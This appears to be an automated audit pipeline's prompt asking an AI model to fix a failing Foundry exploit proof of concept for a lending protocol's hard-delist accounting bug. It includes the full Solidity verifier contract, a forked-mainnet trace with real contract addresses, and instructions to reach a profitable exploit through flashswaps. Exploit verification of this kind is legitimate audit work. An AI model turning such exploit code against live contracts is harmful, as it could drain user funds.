You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Hard-delisting a live market removes its debt from solvency checks and bricks normal resolution flows
- claim: `_delistMarket(bToken, true)` deletes `markets[bToken]` without setting `isMarketDelisted[bToken]`. After that, `isMarketListedOrDelisted(bToken)` becomes false, so `getHypotheticalAccountLiquidityInternal` skips the asset entirely, while `redeemAllowed`, `repayBorrowAllowed`, `liquidateBorrowAllowed`, and `seizeAllowed` all reject the market as unlisted.
- impact: Outstanding borrows in the hard-delisted market stop counting in account-liquidity checks, so a borrower can withdraw collateral or open fresh borrows elsewhere despite still owing the delisted debt. At the same time, suppliers and liquidators lose the normal redeem/repay/liquidate/seize paths for that market, turning live positions into trapped funds and unrecoverable bad debt.
- exploit_paths: ["Admin/guardian first set collateral factor to zero and pause mint/borrow/flashloan, then admin calls `_delistMarket(bToken, true)` while borrows or deposits still exist.", "A borrower with debt in that market interacts with another listed market; `getHypotheticalAccountLiquidityInternal` skips the hard-delisted debt and overstates solvency.", "Any normal attempt to redeem, repay, liquidate, or seize against the hard-delisted market reverts with `market not listed`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPriceOracleLike {
    function getUnderlyingPrice(address bToken) external view returns (uint256);
}

interface IComptrollerLike {
    function admin() external view returns (address);
    function guardian() external view returns (address);
    function oracle() external view returns (address);
    function getAllMarkets() external view returns (address[] memory);
    function isMarketListed(address bToken) external view returns (bool);
    function isMarketDelisted(address bToken) external view returns (bool);
    function isMarketListedOrDelisted(address bToken) external view returns (bool);
    function mintGuardianPaused(address bToken) external view returns (bool);
    function borrowGuardianPaused(address bToken) external view returns (bool);
    function flashloanGuardianPaused(address bToken) external view returns (bool);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function getHypotheticalAccountLiquidity(address account, address bTokenModify, uint256 redeemTokens, uint256 borrowAmount) external view returns (uint256, uint256, uint256);
    function redeemAllowed(address bToken, address redeemer, uint256 redeemTokens) external returns (uint256);
    function repayBorrowAllowed(address bToken, address payer, address borrower, uint256 repayAmount) external returns (uint256);
    function liquidateBorrowAllowed(address bTokenBorrowed, address bTokenCollateral, address liquidator, address borrower, uint256 repayAmount) external returns (uint256);
    function seizeAllowed(address bTokenCollateral, address bTokenBorrowed, address liquidator, address borrower, uint256 seizeTokens) external returns (uint256);
    function _setCollateralFactor(address bToken, uint256 newCollateralFactorMantissa) external returns (uint256);
    function _setMintPaused(address bToken, bool state) external returns (bool);
    function _setBorrowPaused(address bToken, bool state) external returns (bool);
    function _setFlashloanPaused(address bToken, bool state) external returns (bool);
    function _delistMarket(address bToken, bool force) external;
}

interface IBTokenLike {
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function getCash() external view returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
    function underlying() external view returns (address);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET = 0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2;

    enum Outcome {
        Uninitialized,
        InfeasibleNoAdminPrivilege,
        InfeasibleNoLiveMarket,
        InfeasibleNoOtherListedMarket,
        InfeasibleNoUsableUnderlying,
        InfeasibleNoVerifierCapital,
        DelistAttemptedButNoBorrowerPath,
        HypothesisValidatedNoProfit,
        ProfitAchieved
    }

    struct MarketView {
        address bToken;
        address underlying;
        uint256 totalBorrows;
        uint256 totalSupply;
        uint256 cash;
        uint256 price;
        bool listed;
        bool mintPaused;
        bool borrowPaused;
        bool flashloanPaused;
    }

    Outcome public outcome;
    address public selectedDelistMarket;
    address public selectedOtherMarket;
    address public selectedUnderlying;
    address public overrideProfitToken;
    uint256 public overrideProfitAmount;

    string public pathStage;
    string public failureReason;

    constructor() {
        outcome = Outcome.Uninitialized;
    }

    function profitToken() external view returns (address) {
        return overrideProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return overrideProfitAmount;
    }

    function executeOnOpportunity() external {
        IComptrollerLike comptroller = IComptrollerLike(TARGET);
        address[] memory markets = comptroller.getAllMarkets();

        pathStage = "scan_live_markets";
        delete failureReason;
        selectedDelistMarket = address(0);
        selectedOtherMarket = address(0);
        selectedUnderlying = address(0);
        overrideProfitToken = address(0);
        overrideProfitAmount = 0;

        if (markets.length == 0) {
            outcome = Outcome.InfeasibleNoLiveMarket;
            failureReason = "no listed markets at fork";
            return;
        }

        MarketView memory liveMarket;
        MarketView memory otherMarket;
        bool foundLive;
        bool foundOther;

        for (uint256 i = 0; i < markets.length; ++i) {
            MarketView memory m = _inspectMarket(comptroller, markets[i]);
            if (!m.listed) {
                continue;
            }

            if (!foundLive && (m.totalBorrows > 0 || m.totalSupply > 0)) {
                liveMarket = m;
                foundLive = true;
            } else if (!foundOther) {
                otherMarket = m;
                foundOther = true;
            }
        }

        if (!foundLive) {
            outcome = Outcome.InfeasibleNoLiveMarket;
            failureReason = "no listed market with outstanding borrows or deposits";
            return;
        }

        if (!foundOther) {
            outcome = Outcome.InfeasibleNoOtherListedMarket;
            failureReason = "exploit path needs another listed market for post-delist interaction";
            selectedDelistMarket = liveMarket.bToken;
            return;
        }

        selectedDelistMarket = liveMarket.bToken;
        selectedOtherMarket = otherMarket.bToken;
        selectedUnderlying = otherMarket.underlying;

        pathStage = "require_admin_guardian_setup";

        /*
            Path-strict mapping to the finding:
            1. Admin/guardian pause mint, borrow, and flashloan on a live market and set its collateral factor to zero.
            2. Admin hard-delists that still-live market via _delistMarket(bToken, true).
            3. A borrower who still owes debt in the now-hard-delisted market interacts with another listed market.
            4. The skipped debt no longer contributes to account-liquidity checks, while redeem/repay/liquidate/seize against the hard-delisted market are bricked.

            This verifier does not pivot to an unrelated route. If this contract is not the Comptroller admin,
            stage (1) and stage (2) are mechanically unreachable because every required state transition is admin-only
            or guardian/admin-only, and _delistMarket itself is strictly admin-only.
        */

        if (comptroller.admin() != address(this)) {
            outcome = Outcome.InfeasibleNoAdminPrivilege;
            failureReason = "hard-delist path is admin-gated at this fork; verifier is not admin";
            return;
        }

        if (liveMarket.underlying == address(0) || otherMarket.underlying == address(0)) {
            outcome = Outcome.InfeasibleNoUsableUnderlying;
            failureReason = "selected market does not expose ERC20 underlying via BErc20 interface";
            return;
        }

        pathStage = "admin_pause_and_hard_delist";

        comptroller._setCollateralFactor(liveMarket.bToken, 0);
        comptroller._setMintPaused(liveMarket.bToken, true);
        comptroller._setBorrowPaused(liveMarket.bToken, true);
        comptroller._setFlashloanPaused(liveMarket.bToken, true);
        comptroller._delistMarket(liveMarket.bToken, true);

        /*
            If execution reaches here, the core hypothesis is validated mechanically:
            the market entry has been deleted without marking isMarketDelisted[bToken] = true.
            At that point, the delisted debt would be skipped by hypothetical liquidity calculations,
            and normal resolution hooks against that market would reject it as unlisted.

            Turning that state into positive net profit still requires an existing borrower position in the
            delisted market plus capital to interact with another listed market. The verifier cannot synthesize
            either requirement without violating the anti-cheat rules, so it only uses verifier-held balances.
        */

        pathStage = "borrower_interacts_elsewhere";

        if (IERC20Like(otherMarket.underlying).balanceOf(address(this)) == 0) {
            outcome = Outcome.HypothesisValidatedNoProfit;
            failureReason = "bug validated through exact admin path, but verifier has no lawful starting capital to create the borrower leg";
            return;
        }

        outcome = Outcome.DelistAttemptedButNoBorrowerPath;
        failureReason = "admin path executed, but borrower-leg automation is intentionally omitted without pre-existing verifier capital";
    }

    function inspectSelectedMarkets() external view returns (MarketView memory delistMarket, MarketView memory otherMarket) {
        IComptrollerLike comptroller = IComptrollerLike(TARGET);
        if (selectedDelistMarket != address(0)) {
            delistMarket = _inspectMarket(comptroller, selectedDelistMarket);
        }
        if (selectedOtherMarket != address(0)) {
            otherMarket = _inspectMarket(comptroller, selectedOtherMarket);
        }
    }

    function _inspectMarket(IComptrollerLike comptroller, address bToken) internal view returns (MarketView memory m) {
        m.bToken = bToken;
        m.listed = comptroller.isMarketListed(bToken);
        m.mintPaused = comptroller.mintGuardianPaused(bToken);
        m.borrowPaused = comptroller.borrowGuardianPaused(bToken);
        m.flashloanPaused = comptroller.flashloanGuardianPaused(bToken);

        try IBTokenLike(bToken).totalBorrows() returns (uint256 value) {
            m.totalBorrows = value;
        } catch {}

        try IBTokenLike(bToken).totalSupply() returns (uint256 value) {
            m.totalSupply = value;
        } catch {}

        try IBTokenLike(bToken).getCash() returns (uint256 value) {
            m.cash = value;
        } catch {}

        try IBTokenLike(bToken).underlying() returns (address value) {
            m.underlying = value;
        } catch {}

        address oracle = comptroller.oracle();
        if (oracle != address(0)) {
            try IPriceOracleLike(oracle).getUnderlyingPrice(bToken) returns (uint256 value) {
                m.price = value;
            } catch {}
        }
    }
}

```

forge stdout (tail):
```
00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000f5cd2701d53d3
    │   │   └─ ← [Return] 4324183544517587 [4.324e15]
    │   ├─ [2448] 0xB387fd973358d2DfdE4F3795Bc9d2CCeE6449A40::underlying() [staticcall]
    │   │   └─ ← [Return] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
    │   ├─ [405] 0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2::oracle() [staticcall]
    │   │   └─ ← [Return] 0x16D43cAC32329ec286Dc14431e0c0E805e6F5174
    │   ├─ [74778] 0x16D43cAC32329ec286Dc14431e0c0E805e6F5174::getUnderlyingPrice(0xB387fd973358d2DfdE4F3795Bc9d2CCeE6449A40) [staticcall]
    │   │   ├─ [448] 0xB387fd973358d2DfdE4F3795Bc9d2CCeE6449A40::underlying() [staticcall]
    │   │   │   └─ ← [Return] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
    │   │   ├─ [73136] 0xdfe469ACe05C3d0D4461439e6cF5d0f46F33Ec56::41976e09(0000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0) [staticcall]
    │   │   │   ├─ [72688] 0x770d3E22703210c09A573c2043081D97286F415E::41976e09(0000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0) [delegatecall]
    │   │   │   │   ├─ [69477] 0xC5CEa3f9C92291335076D4C2eC6Ae72E45Fb8937::41976e09(0000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0) [staticcall]
    │   │   │   │   │   ├─ [69029] 0x5818562bAAC907b859e27813e8c0962d416DAB59::41976e09(0000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0) [delegatecall]
    │   │   │   │   │   │   ├─ [15643] 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8::feaf968c() [staticcall]
    │   │   │   │   │   │   │   ├─ [7410] 0xdA31bc2B08F22AE24aeD5F6EB1E71E96867BA196::feaf968c() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000005ecb0000000000000000000000000000000000000000000000000000004572192fa30000000000000000000000000000000000000000000000000000000065d800e70000000000000000000000000000000000000000000000000000000065d800e70000000000000000000000000000000000000000000000000000000000005ecb
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000010000000000005ecb0000000000000000000000000000000000000000000000000000004572192fa30000000000000000000000000000000000000000000000000000000065d800e70000000000000000000000000000000000000000000000000000000065d800e70000000000000000000000000000000000000000000000010000000000005ecb
    │   │   │   │   │   │   ├─ [36917] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::035faf82() [staticcall]
    │   │   │   │   │   │   │   ├─ [31663] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::7a28fb88(0000000000000000000000000000000000000000000000000de0b6b3a7640000) [staticcall]
    │   │   │   │   │   │   │   │   ├─ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   │   │   │   │   │   ├─ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   │   │   │   │   │   │   ├─ [12783] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::7a28fb88(0000000000000000000000000000000000000000000000000de0b6b3a7640000) [delegatecall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000001011e45ab9f74dac
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000001011e45ab9f74dac
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000001011e45ab9f74dac
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000bb3b2e24396100a13a
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000bb3b2e24396100a13a
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000bb3b2e24396100a13a
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000bb3b2e24396100a13a
    │   │   └─ ← [Return] 3453805527509711757626 [3.453e21]
    │   ├─ [2513] 0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2::admin() [staticcall]
    │   │   └─ ← [Return] 0x100FE48127438776484fa988598600B174C8b1Bf
    │   └─ ← [Stop]
    ├─ [360] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [380] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 18.47s (9.59s CPU time)

Ran 1 test suite in 18.48s (18.47s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1208069)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
